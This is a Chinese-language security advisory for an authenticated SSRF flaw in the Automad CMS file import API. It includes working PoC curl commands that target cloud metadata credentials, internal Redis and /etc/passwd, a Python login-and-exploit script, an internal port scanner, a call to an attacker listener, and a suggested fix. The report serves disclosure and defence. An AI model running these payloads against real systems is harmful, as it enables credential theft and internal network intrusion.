# AUTOMAD-2025-001: 认证后 SSRF via File Import

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [marcantondahmen/automad](https://github.com/marcantondahmen/automad) |
| **版本** | v2 branch (截至 2026-05-19) |
| **严重性** | High |
| **CVSS 3.1** | 7.2 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) |
| **CWE** | CWE-918 (Server-Side Request Forgery) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/需认证(admin) |

## 漏洞概述

Automad CMS 的文件导入功能 (`FileController::import`) 允许管理员通过 URL 导入文件到 CMS。该功能直接将用户提供的 URL 传给 cURL 发起请求，**没有任何内网地址校验、协议限制或域名白名单**。

攻击者（已认证 admin）可以：
1. 读取云元数据服务（`http://169.254.169.254/latest/meta-data/`）获取 AWS/GCP 凭证
2. 扫描内网端口和服务
3. 访问内部管理接口（如 Redis、Elasticsearch、Docker API）
4. 利用 `CURLOPT_FOLLOWLOCATION` 跟随重定向绕过浅层 URL 检查

## 漏洞代码

**文件**: `automad/src/server/Models/File.php` (import 方法)

```php
public static function import(string $importUrl, string $pageUrl, Messenger $Messenger): bool {
    if (!$importUrl) {
        $Messenger->setError(Text::get('missingUrlError'));
        return false;
    }

    // 本地 URL 解析 — 只是加上 AM_SERVER 前缀，不做安全检查
    if (strpos($importUrl, '/') === 0) {
        $importUrl = AM_SERVER . AM_BASE_URL . $importUrl;
    }

    // ⚠️ 直接用用户 URL 发起 HTTP 请求！
    $data = Fetch::get($importUrl);

    if (empty($data)) {
        $Messenger->setError(Text::get('importFailedError'));
        return false;
    }

    // ... 然后将响应内容写入文件系统 ...
    FileSystem::write($path, $data);
```

**文件**: `automad/src/server/System/Fetch.php`

```php
public static function get(string $url, array $headers = array()): string {
    $options = array(
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_HEADER => 0,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_TIMEOUT => 300,
        CURLOPT_FOLLOWLOCATION => true,   // ← 跟随重定向！
        CURLOPT_FRESH_CONNECT => 1,
        CURLOPT_URL => $url               // ← 用户控制的 URL
    );
    // ...
}
```

**关键缺失**:
- 无 `127.0.0.1`/`localhost`/`0.0.0.0` 检查
- 无 `169.254.169.254`（AWS metadata）检查
- 无 `10.x.x.x`/`172.16-31.x.x`/`192.168.x.x` 检查
- 无协议限制（理论上可尝试 `file://`、`gopher://`）
- `CURLOPT_FOLLOWLOCATION` 允许通过重定向绕过

## 条件

需要管理员 session（已登录 + CSRF token）。但：
- Automad 作为 flat-file CMS，管理员就是站长本人
- 如果攻击者通过 XSS 窃取到 admin CSRF token，可以跨站触发
- 在多用户部署场景下（如学校/机构），低权限 admin 可攻击内网

## PoC (概念验证)

```bash
# 前提：已登录 Automad admin 后台，获取 session cookie 和 CSRF token

# 攻击1: 读取 AWS 元数据（获取实例凭证）
curl -X POST "http://target.com/_api/file/import" \
  -H "Cookie: PHPSESSID=<admin_session>" \
  -d "__csrf__=<csrf_token>&importUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/&url=/"

# 攻击2: 扫描内网 Redis
curl -X POST "http://target.com/_api/file/import" \
  -H "Cookie: PHPSESSID=<admin_session>" \
  -d "__csrf__=<csrf_token>&importUrl=http://10.0.0.1:6379/&url=/"

# 攻击3: 读取本地文件（如果 cURL 支持 file://）
curl -X POST "http://target.com/_api/file/import" \
  -H "Cookie: PHPSESSID=<admin_session>" \
  -d "__csrf__=<csrf_token>&importUrl=file:///etc/passwd&url=/"

# 响应内容会被写入到 pages 目录下的文件
# 然后可以通过文件管理器下载查看
```

## 额外发现: TOCTOU 竞争窗口

`File::import()` 先将数据写入磁盘，然后才检查文件类型：

```php
FileSystem::write($path, $data);      // 先写入
Cache::clear();

if (!FileSystem::isAllowedFileType($path)) {   // 后检查
    $newPath = $path . FileSystem::getImageExtensionFromMimeType($path);
    if (FileSystem::isAllowedFileType($newPath)) {
        // ...
    } else {
        unlink($path);  // 删除 — 但有竞争窗口
        // ...
    }
}
```

在写入和删除之间存在时间窗口（特别是对大文件），攻击者可能在此期间读取/执行文件。

## 本地复现步骤

### 环境搭建

```bash
# 克隆 Automad
git clone https://github.com/marcantondahmen/automad.git
cd automad

# 使用 Docker 或 PHP 内置服务器
# 方式1: Docker
docker-compose up -d

# 方式2: PHP 内置服务器（需要 PHP 8.1+）
composer install
php -S localhost:8080

# 访问 http://localhost:8080/dashboard 完成安装
# 设置管理员密码
```

### 复现 SSRF

```bash
# Step 1: 登录获取 session 和 CSRF token
# 在浏览器登录 admin 后，从 DevTools 获取:
# - Cookie: PHPSESSID=xxx
# - CSRF token（从页面 JS 中提取或从 API 响应中获取）

# Step 2: 调用 file import API
# 用一个外部可控的 HTTP 服务来确认请求发出
# 先在攻击机上启动 listener:
python3 -m http.server 9999 &

# Step 3: 触发 SSRF
curl -X POST "http://localhost:8080/_api/file/import" \
  -b "PHPSESSID=<your_session_id>" \
  -d "__csrf__=<your_csrf_token>&importUrl=http://<attacker_ip>:9999/ssrf-test&url=/"

# 在 listener 上应该能看到来自 Automad 服务器的 HTTP 请求

# Step 4: 验证内网访问
curl -X POST "http://localhost:8080/_api/file/import" \
  -b "PHPSESSID=<your_session_id>" \
  -d "__csrf__=<your_csrf_token>&importUrl=http://127.0.0.1:8080/&url=/"
# 如果成功，会在页面文件中看到 Automad 自身首页的 HTML
```

### 获取 CSRF Token 的详细方法

```bash
# 方法1: 从登录后的 dashboard HTML 中提取
# 登录后访问 dashboard，CSRF token 在 JS 变量中
curl -s -b "PHPSESSID=<session>" "http://localhost:8080/dashboard" | grep -o '"__csrf__":"[^"]*"'

# 方法2: 用 Python 自动化登录+获取 CSRF
python3 << 'EOF'
import requests

base = "http://localhost:8080"
s = requests.Session()

# 登录（替换为你设置的密码）
login = s.post(f"{base}/_api/session/login", data={
    "username": "admin",    # Automad 默认用户名
    "password": "your_password"
})
print(f"Login: {login.status_code}")

# 从 dashboard 获取 CSRF token
dash = s.get(f"{base}/dashboard")
import re
csrf_match = re.search(r'"__csrf__":"([^"]+)"', dash.text)
if csrf_match:
    csrf = csrf_match.group(1)
    print(f"CSRF: {csrf}")
    
    # 触发 SSRF - 读取 AWS metadata
    r = s.post(f"{base}/_api/file/import", data={
        "__csrf__": csrf,
        "importUrl": "http://169.254.169.254/latest/meta-data/",
        "url": "/"
    })
    print(f"SSRF Response: {r.status_code}")
    print(r.text)
else:
    print("Failed to extract CSRF token")
EOF
```

### 验证文件写入

```bash
# 导入的文件会写入到对应 page 的目录
# 查看写入结果
find pages/ -newer /tmp/timestamp -type f
# 或者在 admin 后台的文件管理器中查看

# 查看导入的内容
cat pages/$(find pages/ -newer /tmp/timestamp -name "*" -type f | head -1)
# 如果 SSRF 目标返回了数据，这里能看到
```

### 端口扫描自动化脚本

```python
#!/usr/bin/env python3
"""Automad SSRF Internal Port Scanner"""
import requests
import time

base = "http://localhost:8080"
s = requests.Session()

# 1. 登录
s.post(f"{base}/_api/session/login", data={"username":"admin","password":"your_password"})

# 2. 获取 CSRF
import re
dash = s.get(f"{base}/dashboard")
csrf = re.search(r'"__csrf__":"([^"]+)"', dash.text).group(1)

# 3. 扫描内网端口
TARGET = "127.0.0.1"
PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]

for port in PORTS:
    start = time.time()
    r = s.post(f"{base}/_api/file/import", data={
        "__csrf__": csrf,
        "importUrl": f"http://{TARGET}:{port}/",
        "url": "/"
    })
    elapsed = time.time() - start
    # 判断：有数据=端口开放，无数据/超时=端口关闭
    has_data = "importFailedError" not in r.text
    status = "OPEN" if has_data else "CLOSED"
    print(f"  Port {port:5d}: {status} ({elapsed:.1f}s)")
```

## 修复建议

```php
// 在 File::import() 开头添加 URL 校验
private static function isUrlSafe(string $url): bool {
    $parsed = parse_url($url);
    if (!$parsed || !isset($parsed['host'])) return false;
    
    // 只允许 http/https
    $scheme = strtolower($parsed['scheme'] ?? '');
    if (!in_array($scheme, ['http', 'https'])) return false;
    
    // 解析 IP
    $ip = gethostbyname($parsed['host']);
    
    // 阻止内网地址
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    
    // 阻止 metadata 服务
    if (strpos($ip, '169.254.') === 0) return false;
    
    return true;
}

public static function import(string $importUrl, ...) {
    if (!self::isUrlSafe($importUrl)) {
        $Messenger->setError('URL not allowed: internal or private addresses are blocked');
        return false;
    }
    // ... existing logic ...
}
```

## 参考

- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [AWS SSRF to Instance Credentials](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
